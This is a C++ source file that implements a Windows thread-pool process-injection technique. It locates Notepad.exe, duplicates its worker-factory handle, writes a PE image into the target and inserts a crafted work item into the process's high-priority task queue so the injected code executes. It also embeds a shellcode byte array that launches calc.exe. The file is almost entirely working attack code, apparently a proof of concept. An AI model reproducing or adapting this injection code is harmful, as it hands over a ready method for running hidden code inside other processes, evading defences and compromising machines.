#include "Misc.hpp"
#include "Native.hpp"
#include "SelfPEInject.hpp"
#include "ThreadPool.hpp"

#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

#define WORKER_FACTORY_RELEASE_WORKER		0x0001
#define WORKER_FACTORY_WAIT					0x0002
#define WORKER_FACTORY_SET_INFORMATION		0x0004
#define WORKER_FACTORY_QUERY_INFORMATION	0x0008
#define WORKER_FACTORY_READY_WORKER			0x00010
#define WORKER_FACTORY_SHUTDOWN				0x00020


#define ProcessHandleInformation 51
#define ObjectTypeInformation 2
#define WORKER_FACTORY_ALL_ACCESS ( \
       STANDARD_RIGHTS_REQUIRED | \
       WORKER_FACTORY_RELEASE_WORKER | \
       WORKER_FACTORY_WAIT | \
       WORKER_FACTORY_SET_INFORMATION | \
       WORKER_FACTORY_QUERY_INFORMATION | \
       WORKER_FACTORY_READY_WORKER | \
       WORKER_FACTORY_SHUTDOWN \
)

unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



HANDLE getProcHandlebyName(LPWSTR procName, DWORD* PID) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
			if (wcscmp((entry.szExeFile), procName) == 0) {
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
				hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
				if (!hProc) { continue; }
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

	return NULL;

}


int main() {
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	LPHANDLE pDuplicateHandle = new HANDLE;
	DWORD PID = 0;
	HANDLE hProc = getProcHandlebyName((LPWSTR)L"Notepad.exe", &PID);
	if (!hProc) {
		DEBUG("[x] Cannot open the process\n");
		return -1;
	}
	NTSTATUS ntStatus;
	vector<BYTE> information;
	ULONG returnLength = 0;
	do {
		information.resize(returnLength);
		ntStatus =
			NtQueryInformationProcess(
				hProc,
				static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
				information.data(),
				returnLength,
				&returnLength
			);
		//STATUS_INFO_LENGTH_MISMATCH
	} while (ntStatus == 0xC0000004);

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());

	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
		if (!DuplicateHandle(
			hProc,
			pProcessInformation->Handles[i].HandleValue,
			GetCurrentProcess(),
			pDuplicateHandle,
			WORKER_FACTORY_ALL_ACCESS,
			FALSE,
			NULL
		)) {
			DEBUG("DuplicateHandle Failded\n");
			//return -1;
			continue;
		}


		vector<BYTE> object;
		returnLength = 0;
		do {
			object.resize(returnLength);
			ntStatus =
				NtQueryObject(
					*pDuplicateHandle,
					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
					object.data(),
					returnLength,
					&returnLength);
		} while (ntStatus == 0xC0000004);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
		if (wstring(pObjectInformation->TypeName.Buffer) == L"TpWorkerFactory") {
			break;
		}
	}

	LPVOID OEP = WritePEToTarget(hProc, "C:\\Users\\vuong\\source\\repos\\MessageBoxA\\x64\\Release\\MessageBoxA.exe");

	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	NtQueryInformationWorkerFactoryPtr NtQueryInformationWorkerFactoryfn = (NtQueryInformationWorkerFactoryPtr)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
	ntStatus = NtQueryInformationWorkerFactoryfn(
		*pDuplicateHandle,
		WorkerFactoryBasicInformation,
		&WorkerFactoryInformation,
		sizeof(WorkerFactoryInformation),
		nullptr
	);
	if (!NT_SUCCESS(ntStatus)) {
		DEBUG("[x] Failed to NtQueryInformationWorkerFactory : %p \n", ntStatus);
		return -1;
	}

	SIZE_T byteWritten;
	vector<BYTE> buffer;
	buffer.resize(sizeof(FULL_TP_POOL));
	SIZE_T byteRead;
	PVOID a = (PVOID) & WorkerFactoryInformation;
	PVOID kk = &WorkerFactoryInformation.StartParameter;
	ReadProcessMemory(hProc, WorkerFactoryInformation.StartParameter, buffer.data(), sizeof(FULL_TP_POOL), &byteRead);
	PFULL_TP_POOL pTargetTpPool = reinterpret_cast<PFULL_TP_POOL>(buffer.data());
	const auto TargetTaskQueueHighPriorityList = &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
	const auto pTpWork = (PFULL_TP_WORK)CreateThreadpoolWork(static_cast<PTP_WORK_CALLBACK>(OEP), nullptr, nullptr);
	pTpWork->CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(WorkerFactoryInformation.StartParameter);
	pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
	pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
	pTpWork->WorkState.Exchange = 0x2;

	const auto pRemoteTpWork = static_cast<PFULL_TP_WORK>(VirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	WriteProcessMemory(hProc, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), &byteWritten);
	auto RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;

	WriteProcessMemory(hProc, &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), &byteWritten);
	WriteProcessMemory(hProc, &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), &byteWritten);


	return 1;

}